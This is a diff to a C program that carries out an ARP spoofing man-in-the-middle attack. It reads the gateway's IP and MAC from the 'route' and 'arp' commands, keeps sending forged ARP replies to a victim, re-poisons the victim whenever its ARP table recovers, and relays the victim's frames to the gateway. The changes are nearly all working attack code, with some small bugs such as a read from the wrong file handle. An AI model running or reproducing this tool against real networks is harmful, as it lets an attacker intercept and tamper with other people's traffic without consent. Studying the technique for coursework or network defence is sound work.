@@ -10,11 +10,13 @@
 #include <linux/if_packet.h>
 #include <sys/ioctl.h>
 #include <netinet/ip.h>
+#include <netinet/ether.h>
 #include <errno.h>            // errno, perror()
 #include <pthread.h>
 #define ARPOP_REPLY 2         // Taken from <linux/if_arp.h>
-
-uint8_t gateway_mac[6];
+struct in_addr gw_ip_addr;
+struct ether_addr *gw_mac_addr;
+//uint8_t gateway_mac[6];
 typedef struct parameter Parameter;
 struct parameter {
   int sd;
@@ -48,20 +50,20 @@ void *send_packet(void *P) {
       perror("sendto() failed");
       exit(EXIT_FAILURE);
     }
-    printf("[+]SEND SPOOFING PACKET  1\n");
+    printf("[+]SEND SPOOFING PACKET\n");
     //close(p.sd);
-    sleep(2);
+    sleep(10);
   }
 }
 
 
-void *send_spoofing(Parameter p){
+void send_spoofing(Parameter p){
   int bytes;
   if ((bytes = sendto(p.sd, p.ether_frame, p.frame_length, 0, (struct sockaddr *) &(p.device), sizeof(p.device))) <= 0) {
       perror("sendto() failed");
       exit(EXIT_FAILURE);
   }
-  printf("[+]SEND SPOOFING PACKET  2\n");
+  printf("[+]SEND SPOOFING PACKET.\n");
 }
 
 void *relay_packet(void *pk){
@@ -71,7 +73,7 @@ void *relay_packet(void *pk){
   uint8_t broadcast_mac[6];
   struct sockaddr_ll device;
   PK = *((arp_hdr *)pk);
-  int bytes, sd, err;
+  int bytes, sd, sd2, err;
 
   memset(broadcast_mac, 0xff, 6 * sizeof(uint8_t));
   ether_frame = (uint8_t *)malloc(IP_MAXPACKET * sizeof(uint8_t));
@@ -84,10 +86,7 @@ void *relay_packet(void *pk){
   device.sll_family = AF_PACKET;
   device.sll_halen = 6;
   device.sll_protocol  = htons(ETH_P_ARP);
-  printf("relay function start\n");
-
-
-
+  printf("RELAY DETECTING...\n");
   while(1){
     if ((sd =socket( AF_PACKET , SOCK_RAW , htons(ETH_P_ALL))) < 0) {
       perror("socket() failed ");
@@ -99,76 +98,53 @@ void *relay_packet(void *pk){
         perror("bind(): ");
         exit(-1);
     }
-    printf("relay function start 111\n");
     if ((recv(sd, ether_frame, IP_MAXPACKET, 0)) > 0) {
-      /*
-      if (errno == EINTR) {
-        memset(ether_frame, 0, IP_MAXPACKET * sizeof(uint8_t));
-        perror("recv error\n");
-        continue;
-      }
-      */
-      printf("relay function 1\n");
 
       arphdr_rcv = (arp_hdr *)(ether_frame + LIBNET_ETH_H);
-      printf("relay function 2\n");
 
       //if broadcast packet , victim's ARP table will be recovered
       if (memcmp(ether_frame, broadcast_mac, 6) == 0 &&  //broadcast mac = 0xFFFFFFFFFFFF
-      (memcmp(arphdr_rcv->sender_ip, PK.sender_ip, 4) == 0 || //victim's broadcast
-        memcmp(arphdr_rcv->sender_ip, PK.target_ip, 4) == 0    //gateway's broadcast
+      (memcmp(arphdr_rcv->sender_ip, &PK.sender_ip, 4) == 0 || //victim's broadcast
+        memcmp(arphdr_rcv->sender_ip, &PK.target_ip, 4) == 0    //gateway's broadcast
         )){
-        if (memcmp(arphdr_rcv->sender_ip, PK.sender_ip, 4) == 0) printf("[+]VICTIM BROADCAST (ARP table recovered)\n");
-        else if (memcmp(arphdr_rcv->sender_ip, PK.target_ip, 4) == 0) printf("[+]GATEWAY BROADCAST (ARP table recovered)\n");
-
-        /*
-      arphdr_rcv->sender_mac =  PK.target_mac ; //attacker's mac
-      arphdr_rcv->sender_ip  =  PK.target_ip  ; //gateway's ip
-      arphdr_rcv->target_mac =  PK.sender_mac ; //victim's mac
-      arphdr_rcv->target_ip  =  PK.sender_ip  ; //victim's ip
-      */
+        if (memcmp(arphdr_rcv->sender_ip, &PK.sender_ip, 4) == 0) printf("[+]VICTIM'S BROADCAST (ARP table recovered)\n");
+        else if (memcmp(arphdr_rcv->sender_ip, &PK.target_ip, 4) == 0) printf("[+]GATEWAY'S BROADCAST (ARP table recovered)\n");
 
         // send spoofing packet to victim
-        memcpy(device.sll_addr, PK.sender_mac, 6 * sizeof(uint8_t));
+        memcpy(device.sll_addr, &PK.sender_mac, 6 * sizeof(uint8_t));\
         send_spoofing(spoof_P);
-
 
       }
        //if spoofed packet , relay
       else if(
-        (memcmp(arphdr_rcv->sender_mac, &PK.sender_mac, 6) == 0) &&
-        (memcmp(arphdr_rcv->sender_ip, &PK.sender_ip, 4) == 0) &&
-        (memcmp(arphdr_rcv->target_mac, &PK.target_mac, 6) == 0) &&
-        (memcmp(arphdr_rcv->target_ip, &PK.target_ip, 4) == 0)
+        (memcmp(arphdr_rcv->sender_mac, &PK.sender_mac, 6) == 0) &&   //victim's mac
+        (memcmp(arphdr_rcv->sender_ip,  &PK.sender_ip, 4) == 0) && //victim's ip
+        (memcmp(arphdr_rcv->target_mac, &PK.target_mac, 6) == 0) &&  //attacker's mac
+        (memcmp(arphdr_rcv->target_ip,  &PK.target_ip, 4) == 0) //gateway's ip
         ){
 
         memcpy(device.sll_addr, arphdr_rcv->sender_mac, 6 * sizeof(uint8_t));
+        memcpy(arphdr_rcv->sender_mac, &PK.target_mac , 6);   //change sender mac to attacker mac
+        memcpy(arphdr_rcv->target_mac, gw_mac_addr ,6);  //change target mac to gateway mac
+        memcpy(ether_frame,gw_mac_addr,6);  //change target mac to gateway mac
+        memcpy(ether_frame+6,&PK.target_mac,6); //change sender mac to attacker mac
 
-        memcpy(arphdr_rcv->target_mac, gateway_mac ,6);   //change target mac to gateway mac
 
-
-        if ((bytes = sendto(sd, ether_frame, LIBNET_ETH_H + LIBNET_ARP_ETH_IP_H, 0, (struct sockaddr *) &(device), sizeof(device))) <= 0) {
+        if ((sd2 =socket( AF_PACKET , SOCK_RAW , htons(ETH_P_ALL))) < 0) {
+      perror("socket() failed ");
+      exit(EXIT_FAILURE);
+        }
+        if ((bytes = sendto(sd2, ether_frame, LIBNET_ETH_H + LIBNET_ARP_ETH_IP_H, 0, (struct sockaddr *) &(device), sizeof(device))) <= 0) {
           perror("sendto() failed at reply");
           exit(EXIT_FAILURE);
         }
-        printf("[+]Send relay packet to Gateway\n");
-
-
+        printf("[+]SEND RELAY PACKET TO GATEWAY\n");
       }
-
-
     }
     close(sd);
-
-
-
+    close(sd2);
   }
-
-
 }
-
-
-
 
 int main(int argc, char* argv[]) {
   libnet_t *l;  /* libnet context */
@@ -187,12 +163,13 @@ int main(int argc, char* argv[]) {
   ether_frame = (uint8_t *)malloc(IP_MAXPACKET * sizeof(uint8_t));
   ether_frame2 = (uint8_t *)malloc(IP_MAXPACKET * sizeof(uint8_t));
   memset(ether_frame, 0, IP_MAXPACKET * sizeof(uint8_t));
-  struct in_addr gw_ip_addr;
+
   char buff[1024];
+  char buff2[1024];
   int count = 0;
   pthread_t p_thread[2];
   int thr_id, thr_id2;
-
+  char str[256];
 
   /* get gateway address  */
   FILE *in = popen("route", "r");
@@ -203,9 +180,22 @@ int main(int argc, char* argv[]) {
   while (buff[count] == ' ') count++;
   inet_aton(buff + count, &gw_ip_addr);
   printf("\n [+]Gateway IP Adress : %s\n", inet_ntoa(gw_ip_addr));
-  memcpy(gateway_mac, &gw_ip_addr, 6*sizeof(uint8_t));
-
   pclose(in);
+/*
+  Address                  HWtype  HWaddress           Flags Mask            Iface
+  192.168.230.2            ether   00:50:56:f4:44:1d   C                     ens33
+*/
+  sprintf(str, "arp %s",inet_ntoa(gw_ip_addr));
+  FILE *in2 = popen(str, "r");
+  count=0;
+  fgets(buff2, sizeof(buff2), in);
+  fgets(buff2, sizeof(buff2), in);
+  while (buff2[count] != ' ') count++;
+  while (buff2[count] == ' ') count++;
+  while (buff2[count] != ' ') count++;
+  while (buff2[count] == ' ') count++;
+  gw_mac_addr=ether_aton(buff2 + count);
+  pclose(in2);
   printf("\n [+]PRINT REQUEST_PACKET\n");
   struct in_addr target_ip_addr;
   inet_aton(argv[1], &target_ip_addr);
@@ -348,9 +338,6 @@ int main(int argc, char* argv[]) {
       }
     }
   }
-
-
-
   ////////////////// print received packet ///////////////////
 
   // Print out contents of received ethernet frame.
@@ -391,15 +378,12 @@ int main(int argc, char* argv[]) {
     arphdr_receive->target_ip[0], arphdr_receive->target_ip[1], arphdr_receive->target_ip[2], arphdr_receive->target_ip[3]);
   printf("\n");
 
-
-
   ////////////////////// 3.send spoofing packet    /////////////////////////////////////
 
   arp_hdr arphdr_spoof;
   uint8_t *ether_frame3;
   ether_frame3 = (uint8_t *)malloc(IP_MAXPACKET * sizeof(uint8_t));
   memset(ether_frame3, 0, IP_MAXPACKET * sizeof(uint8_t));
-
 
   // ARP header (request)
   // target mac = victim
@@ -426,7 +410,7 @@ int main(int argc, char* argv[]) {
 
 
   // OpCode: 1 for ARP request
-  arphdr_spoof.opcode = htons(ARPOP_REQUEST);
+  arphdr_spoof.opcode = htons(ARPOP_REPLY);
 
   // Sender hardware address (48 bits): MAC address
   memcpy(&arphdr_spoof.sender_mac, &arphdr_send.sender_mac, 6 * sizeof(uint8_t));
@@ -452,7 +436,6 @@ int main(int argc, char* argv[]) {
   uint8_t *dst_mac_spf;
   dst_mac_spf = (uint8_t *)malloc(6 * sizeof(uint8_t));
   memcpy(dst_mac_spf, arphdr_receive->sender_mac, 6 * sizeof(uint8_t));
-
 
   // Destination and Source MAC addresses
   memcpy(ether_frame3, arphdr_receive->sender_mac, 6 * sizeof(uint8_t));
@@ -505,25 +488,9 @@ int main(int argc, char* argv[]) {
   memcpy(pk.sender_ip, arphdr_spoof.target_ip, 4 * sizeof(uint8_t));
   memcpy(pk.target_mac, arphdr_spoof.sender_mac, 6 * sizeof(uint8_t));
   memcpy(pk.target_ip, arphdr_spoof.sender_ip, 4 * sizeof(uint8_t));
-
-
   thr_id = pthread_create(&p_thread[0], NULL, send_packet, (void *)&spoof_P); //send infected packet
   thr_id2 = pthread_create(&p_thread[1], NULL, relay_packet, (void *)&pk); // relay infected packet
 
-/*
-  while (1) {
-    // Send ethernet frame to socket.
-    // Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (ARP header)
-    if ((bytes = sendto(sd3, ether_frame3, frame_length, 0, (struct sockaddr *) &device, sizeof(device))) <= 0) {
-
-      perror("sendto() failed");
-      exit(EXIT_FAILURE);
-    }
-
-    sleep(1);
-  } //while end
-
-*/
   pthread_join(p_thread[0],NULL);
   pthread_join(p_thread[1],NULL);
   free(mac_buff);
@@ -532,7 +499,6 @@ int main(int argc, char* argv[]) {
   free(ether_frame2);
   close(sd);
   close(sd2);
-
 
   close(sd3);
 
